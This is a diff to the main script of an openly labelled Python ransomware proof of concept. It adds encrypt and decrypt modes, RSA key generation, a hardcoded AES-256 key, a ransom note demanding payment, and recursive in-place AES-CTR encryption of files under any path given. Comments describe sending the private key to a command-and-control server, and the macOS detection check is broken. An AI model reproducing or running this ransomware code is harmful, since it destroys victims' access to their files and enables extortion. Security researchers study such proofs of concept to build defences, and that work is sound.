@@ -19,32 +19,62 @@ import modify
 #  set to either: '128/192/256 bit plaintext key' or False
 HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key
 
-def get_parser():
-    parser = argparse.ArgumentParser(description='Wastedlocker')
-    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %HOME%/test_ransomware [default: no]', action="store", dest="path")
-    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
-                        action="store_true")
-    return parser
+def parse_args():
+    parser = argparse.ArgumentParser(description='Ransomware PoC')
+    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")
+
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
+                        action='store_true')
+    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
+                        action='store_true')
+
+    return parser.parse_args()
 
 def main():
-    parser  = get_parser()
-    args    = vars(parser.parse_args())
-    decrypt = args['decrypt']
-    absolute_path = args['path']
+    if len(sys.argv) <= 1:
+        print('[*] Ransomware - PoC\n')
+        # banner()
+        print('Usage: python3 main.py -h')
+        print('{} -h for help.'.format(sys.argv[0]))
+        exit(0)
+
+    # Parse arguments
+    args = parse_args()
+    encrypt = args.encrypt
+    decrypt = args.decrypt
+    absolute_path = str(args.path)
+
+    if absolute_path != 'None':
+        startdirs = [absolute_path]
+    else:
+        # Check OS
+        plt = platform.system()
+        if plt == ("Linux" or "Darwin"):
+            startdirs = [os.environ['HOME'] + '/test_ransomware']
+        elif plt == "Windows":
+            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
+        else:
+            print("Unidentified system")
+            exit(0)
+   
+    # RSA Generation
     rsa_gen = RSA.generate(2048)
     publickey = rsa_gen.publickey()  
 
+    # RSA Encryption function
     encryptor = PKCS1_OAEP.new(publickey)
     encrypted_key =  encryptor.encrypt(HARDCODED_KEY)
     
-    ## Decryption function
+    ## RSA Decryption function
     # decryptor = PKCS1_OAEP.new(rsa_keys)
     # decrypted = decryptor.decrypt(str(encrypted_key))
   
+    # RSA Public and Private Keys
     public_key = rsa_gen.publickey().exportKey()
     private_key = rsa_gen.export_key() # Private key sent via C2 or exfiltrated
 
-    if not decrypt:
+    if encrypt:
         print("[COMPANY_NAME]\n\n"
             "YOUR NETWORK IS ENCRYPTED NOW\n\n"
             "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
@@ -53,33 +83,17 @@ def main():
             "THE FILE IS ECNRYPTED WITH THE FOLLOWING KEY\n"
             "[begin_key]\n{}\n[end_key]\n"
             "KEEP IT\n".format(public_key.decode("utf-8")))
-
-    if decrypt:
         key = HARDCODED_KEY
-    else:
+    if decrypt:
         # In real ransomware, this part includes sending the private_key to the C2
         # and/or the encrypted AES keys and public_key 
-        if HARDCODED_KEY:
-            key = HARDCODED_KEY
+        key = HARDCODED_KEY
            
+    # Create AES counter and AES cipher
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
-    plt = platform.system()
-    if plt == ("Linux" or "Darwin"):
-        if absolute_path:
-            startdirs = [absolute_path]
-        else:
-            startdirs = [os.environ['HOME'] + '/test_ransomware']
-    elif plt == "Windows":
-        if absolute_path:
-            startdirs = [absolute_path]
-        else:
-            startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
-    else:
-        print("Unidentified system")
-        exit()
-
+    # Recursively go through folders and encrypt/decrypt files
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             modify.modify_file_inplace(file, crypt.encrypt)
